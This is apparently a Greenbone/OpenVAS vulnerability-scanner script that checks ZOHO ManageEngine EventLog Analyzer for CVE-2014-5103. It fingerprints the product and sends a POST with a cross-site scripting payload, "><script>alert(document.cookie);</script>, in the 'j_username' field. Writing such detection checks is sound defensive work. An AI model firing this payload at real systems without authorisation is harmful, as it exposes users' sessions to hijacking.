if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804815" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-5103" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-08-19 14:57:37 +0530 (Tue, 19 Aug 2014)" );
	script_name( "ZOHO ManageEngine EventLog Analyzer 'j_username' Parameter XSS Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with ZOHO ManageEngine EventLog Analyzer and is prone
  to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'j_username' POST parameter to event/j_security_check
  script is not properly sanitised before returning to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "ZOHO ManageEngine EventLog Analyzer version 9.0 build 9000 and probably
  other versions." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/94815" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2014/Jul/100" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127568" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2014-07/0100.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8400 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
zohoPort = http_get_port( default: 8400 );
url = "/event/index3.do";
req = http_get( item: url, port: zohoPort );
res = http_keepalive_send_recv( port: zohoPort, data: req );
if(res && ContainsString( res, ">ZOHO Corp.<" ) && ContainsString( res, ">ManageEngine EventLog Analyzer" )){
	postData = "forChecking=&j_username=%22%3E%3Cscript%3Ealert%28document.cookie" + "%29%3B%3C%2Fscript%3E&j_password=12&domains=&loginButton=Login&optionValue=hide";
	url = "/event/j_security_check";
	host = http_host_name( port: zohoPort );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
	res = http_keepalive_send_recv( port: zohoPort, data: req );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie);</script>" )){
		security_message( port: zohoPort );
		exit( 0 );
	}
}

